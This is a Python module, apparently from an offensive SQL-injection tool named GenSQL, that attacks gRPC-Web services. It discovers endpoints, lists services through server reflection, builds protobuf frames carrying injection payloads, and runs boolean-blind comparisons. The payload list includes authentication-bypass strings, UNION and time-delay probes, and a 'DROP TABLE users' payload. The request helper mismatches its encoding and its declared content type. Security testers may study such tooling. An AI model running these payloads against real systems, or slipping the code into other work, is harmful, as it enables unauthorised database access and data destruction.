#!/usr/bin/env python
"""GenSQL Technique: gRPC-Web Injection. Author: Jeevraj"""
import struct
import json
import urllib.request
import base64


class GRPCInjector:
    """gRPC-Web injection: reflection, proto field tampering, streaming, blind boolean."""

    GRPC_CONTENT_TYPE      = "application/grpc-web+proto"
    GRPC_WEB_TEXT_TYPE     = "application/grpc-web-text+proto"

    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "1 OR 1=1",
        "' UNION SELECT NULL--",
        "'; SELECT SLEEP(3)--",
        "1; DROP TABLE users--",
    ]

    def __init__(self, timeout=15):
        self.timeout = timeout

    def detect_grpc_endpoint(self, url):
        """Detect gRPC-Web endpoints by sending a probe request."""
        # Probe frame: 1-byte flag=0, 4-byte length=1, 1 byte message field
        probe = self.encode_grpc_web(bytes([0x0a]))  # field 1, wire 2, empty
        endpoints = [url] + [url.rstrip("/") + p for p in ["/grpc", "/api/grpc", "/rpc"]]
        found = []
        for ep in endpoints:
            resp = self._send_grpc(ep, probe)
            if resp and any(k in str(resp) for k in ["grpc", "proto", "grpc-status"]):
                found.append(ep)
        return found

    def encode_grpc_web(self, message_bytes):
        """Encode bytes as gRPC-Web frame: 1-byte flag + 4-byte big-endian length + data."""
        length = len(message_bytes)
        header = struct.pack(">BI", 0, length)   # flag=0 (uncompressed)
        return header + message_bytes

    def decode_grpc_response(self, raw_bytes):
        """Decode gRPC-Web response frame."""
        if not raw_bytes or len(raw_bytes) < 5:
            return {"error": "response too short"}
        flag   = raw_bytes[0]
        length = struct.unpack(">I", raw_bytes[1:5])[0]
        data   = raw_bytes[5:5 + length]
        return {"flag": flag, "length": length, "data": data}

    def inject_proto_field(self, endpoint, service, method, payload,
                           field_number=1, wire_type=2):
        """Inject into a protobuf string field (wire type 2 = length-delimited)."""
        encoded   = payload.encode("utf-8")
        field_tag = (field_number << 3) | wire_type
        tag_bytes = self._encode_varint(field_tag)
        len_bytes = self._encode_varint(len(encoded))
        proto_msg = tag_bytes + len_bytes + encoded
        frame     = self.encode_grpc_web(proto_msg)
        url       = "%s/%s/%s" % (endpoint.rstrip("/"), service, method)
        return self._send_grpc(url, frame)

    def blind_boolean_grpc(self, endpoint, true_payload, false_payload,
                           service="", method=""):
        """Boolean-based blind injection via gRPC response size difference."""
        true_resp  = self.inject_proto_field(endpoint, service, method, true_payload)
        false_resp = self.inject_proto_field(endpoint, service, method, false_payload)
        return {
            "injectable": str(true_resp) != str(false_resp),
            "true_len":   len(str(true_resp)),
            "false_len":  len(str(false_resp)),
        }

    def reflect_services(self, endpoint):
        """Use gRPC Server Reflection to discover available services."""
        # ServerReflectionRequest: field 4 list_services = "" (tag 0x22, length 0x00)
        list_services_proto = bytes([0x22, 0x00])
        frame = self.encode_grpc_web(list_services_proto)
        url   = (endpoint.rstrip("/")
                 + "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo")
        return self._send_grpc(url, frame)

    def sqli_through_grpc(self, endpoint, service, method):
        """Run all SQLI payloads through a gRPC string field."""
        results = []
        for payload in self.SQLI_PAYLOADS:
            resp = self.inject_proto_field(endpoint, service, method, payload)
            results.append({"payload": payload, "response": resp})
        return results

    # ── Helpers ───────────────────────────────────────────────────────────
    def _encode_varint(self, value):
        """Encode integer as Protocol Buffers varint."""
        bits = []
        while value > 0x7F:
            bits.append((value & 0x7F) | 0x80)
            value >>= 7
        bits.append(value & 0x7F)
        return bytes(bits)

    def _send_grpc(self, url, frame_bytes):
        try:
            encoded = base64.b64encode(frame_bytes)
            req = urllib.request.Request(
                url,
                data=base64.b64decode(encoded),
                headers={
                    "Content-Type": self.GRPC_WEB_TEXT_TYPE,
                    "Accept":       self.GRPC_WEB_TEXT_TYPE,
                    "X-Grpc-Web":   "1",
                    "User-Agent":   "GenSQL/2.0 grpc-web",
                },
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return {
                    "status":  r.status,
                    "body":    r.read(),
                    "headers": dict(r.headers),
                }
        except Exception as ex:
            return {"error": str(ex)}
